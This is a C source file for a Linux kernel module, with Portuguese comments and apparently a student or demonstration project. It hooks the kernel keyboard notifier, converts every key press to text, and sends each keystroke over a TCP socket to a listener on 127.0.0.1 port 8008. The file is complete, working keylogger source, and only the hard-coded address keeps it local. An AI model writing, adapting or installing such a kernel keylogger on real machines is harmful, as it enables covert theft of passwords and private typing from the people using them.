#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>

#define PORTA 8008

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hugo Nakamura/Isaac Soares");
MODULE_DESCRIPTION("Exemplo de módulo do kernel para ler entradas de teclado");

struct socket * socket = NULL;

static const char *mapa_de_teclas[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

u32 criaEndereco(u8 * ip);
int enviarMensagem(struct socket * localSocket, const char * mensagem, const size_t tam, unsigned long flags);
int conectarServidor(void);

void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf);
int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro);
static struct notifier_block bloco_observador_teclado = {
    .notifier_call = manipulador_evento_teclado,
};


static int __init iniciaModulo(void)
{
    printk(KERN_INFO "Iniciando modulo.\n");
    //Iniciar o servidor.
    conectarServidor();

    //Iniciar o notifier do teclado.
    register_keyboard_notifier(&bloco_observador_teclado);
    return 0;
}

static void __exit fechaModulo(void)
{
    printk(KERN_INFO "Fechando modulo.\n");
    unregister_keyboard_notifier(&bloco_observador_teclado);
}

module_init(iniciaModulo);
module_exit(fechaModulo);

void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf){
    // Se a tecla esta dentro do intervalo de teclas mapeadas.
    if (codigo_tecla > KEY_RESERVED && codigo_tecla <= KEY_PAUSE)
    {
        // Se o shift estiver pressionado pega codigo na posicao 1 se nao pega na posicao 0.
        const char *string_tecla = (mascara_shift == 1)
                                ? mapa_de_teclas[codigo_tecla][1]
                                : mapa_de_teclas[codigo_tecla][0];
        // Copia o const char para o buffer como string.
        snprintf(buf, tam_buf, "%s", string_tecla);
    }
}

int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro){
    // Cria buffer para a conversao do codigo de tecla para string.
    char buffer_teclas[12] = {0};

    // Converte o parametro (void *) recebido prara (keyboard_notifier_param *). 
    struct keyboard_notifier_param *parametro = _parametro;
 
    if (!(parametro->down)) return NOTIFY_OK;
    
    // Converte o codigo da tecla na string equivalente e salva no buffer.
    converte_codigo_tecla_para_string(parametro->value, parametro->shift, buffer_teclas, 12);
    
    // Se a string for nula ele termina a rotina aqui.
    if (strlen(buffer_teclas) < 1) return NOTIFY_OK;
    
    // Cria uma string para enviar pelo socket.
    char enviar[32];
    memset(&enviar, 0, 32);

    // Monta a string no padrão "Keylog: <tecla>".
    strcat(enviar, "Keylog: ");
    strcat(enviar, buffer_teclas);
    strcat(enviar, "\n");

    // Envia a string pelo socket.
    enviarMensagem(socket, enviar, strlen(enviar), MSG_DONTWAIT);

    // Printa no log (local) a tecla precionada.
    printk(KERN_INFO "Keylog: %s", buffer_teclas);
 
    return NOTIFY_OK;
}

u32 criaEndereco(u8 *ip){
    u32 addr = 0;
    int i;

    for(i = 0; i<4; i++){
        addr += ip[i];
        if(i==3)
            break;
        addr <<= 8;
    }

    return addr;
}

int enviarMensagem(struct socket *localSocket, const char * mensagem, const size_t tam, unsigned long flags){
    //Cria estruturas de mensagem (msghdr) e de buffer (kvec).
    struct msghdr msg;
    struct kvec vec;
    int len, written = 0, left = tam;

    //Inicializa a struct msghdr msg.
    msg.msg_name = 0;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = flags;
    
    //While para enviar byte-a-byte.
    while(1){
        //Incrementa o buffer em 'written' bytes;
        vec.iov_len = left;
        vec.iov_base = (char *)mensagem + written;

        //Envia a mensagem pelo socket e retorna o número de bytes enviados.
        len = kernel_sendmsg(localSocket, &msg, &vec, left, left);

        //Caso haja alguma flag intermediária, continue.
        if(len == -ERESTARTSYS || !(flags & MSG_DONTWAIT) && len == -EAGAIN)
            continue;

        //Enquanto os bytes continuarem a ser enviados, atualiza as variáveis.
        if(len > 0){
            written += len;
            left -= len;
            if(left)
                continue;

        }

        //Se chegou aqui, é porque todos os bytes foram enviados.
        break;
    }
    return written ? written:len;
}

int conectarServidor(void){
    //Cria uma estrutura de endereço e o endereço de IP.
    struct sockaddr_in endereco;
    unsigned char ip[5] = {127,0,0,1,'\0'};

    int len = 63;
    char reply[64];
    int erro = -1;

    //Cria o socket.
    erro = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &socket);
    if(erro < 0)
        return -1;
    memset(&endereco, 0, sizeof(endereco));

    //Configura uma conexão TCP, na porta 'PORTA', no IP 'ip'.
    endereco.sin_family = AF_INET;
    endereco.sin_port = htons(PORTA);
    endereco.sin_addr.s_addr = htonl(criaEndereco(ip));

    //Conecta socket.
    erro = socket->ops->connect(socket, (struct sockaddr*)&endereco, sizeof(endereco), O_RDWR);
    if(erro && erro != -EINPROGRESS)
        return -1;

    return 0;
}